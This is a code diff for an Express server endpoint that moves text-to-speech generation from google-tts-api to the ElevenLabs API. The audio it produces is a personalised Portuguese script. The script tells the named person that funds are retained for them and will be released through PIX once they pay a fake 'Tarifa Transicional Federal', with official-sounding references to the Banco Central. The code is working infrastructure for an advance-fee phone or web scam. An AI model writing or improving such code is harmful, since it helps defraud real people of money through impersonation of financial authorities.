@@ -541,8 +541,6 @@ app.get("/api/config", (req, res) => {
 });
 
 // --- NOVO: TTS E BUYPIX ---
-import * as googleTTS from 'google-tts-api';
-
 app.post("/api/v1/tts", async (req, res) => {
   const { name } = req.body;
   if (!name) return res.status(400).json({ error: "Nome não fornecido" });
@@ -551,20 +549,30 @@ app.post("/api/v1/tts", async (req, res) => {
   const script = `Olá, ${firstName}. Identificamos que você possui valores residuais retidos e prontos para liberação imediata em sua conta via PIX. O seu processo de homologação foi concluído com sucesso. No entanto, para que a transferência seja efetuada pelo Banco Central, é necessário o recolhimento de uma taxa unificada, conhecida como Tarifa Transicional Federal. Mas não se preocupe: esta é uma exigência legal padrão para o custeio operacional da transação e prevenção contra fraudes financeiras. Assim que a tarifa for compensada no sistema, o valor total do seu resgate será creditado automaticamente na sua chave PIX cadastrada em até dois minutos. Clique no botão abaixo para realizar o pagamento da tarifa transicional e concluir o seu saque agora mesmo.`;
   
   try {
-    // Generate TTS URL (split into chunks if needed, but google-tts-api handles up to 200 chars. 
-    // We'll generate a base64 from the first chunk for simplicity or just use the first chunk to test,
-    // Actually google-tts-api's getAudioUrl only supports 200 chars. Let's use getAllAudioBase64
-    const audioContent = await googleTTS.getAllAudioBase64(script, {
-      lang: 'pt-BR',
-      slow: false,
-      host: 'https://translate.google.com',
-      splitPunct: ',.?'
-    });
+    const apiKey = process.env.ELEVENLABS_API_KEY || "";
+    if (!apiKey) throw new Error("Chave ElevenLabs não configurada no .env");
+
+    const response = await axios.post(
+      `https://api.elevenlabs.io/v1/text-to-speech/JBFqnCBsd6RMkjVDRZzb`, // voice_id sugerido
+      {
+        text: script,
+        model_id: 'eleven_multilingual_v2',
+        output_format: 'mp3_44100_128'
+      },
+      {
+        headers: {
+          'xi-api-key': apiKey,
+          'Content-Type': 'application/json'
+        },
+        responseType: 'arraybuffer' // Essencial para converter em Base64
+      }
+    );
     
+    const audioContent = Buffer.from(response.data).toString('base64');
     res.json({ success: true, audioBase64: audioContent });
   } catch (err: any) {
-    console.error("TTS Error:", err.message);
-    res.status(500).json({ error: "Erro ao gerar TTS" });
+    console.error("TTS ElevenLabs Error:", err.response?.data || err.message);
+    res.status(500).json({ error: "Erro ao gerar TTS ElevenLabs" });
   }
 });
 
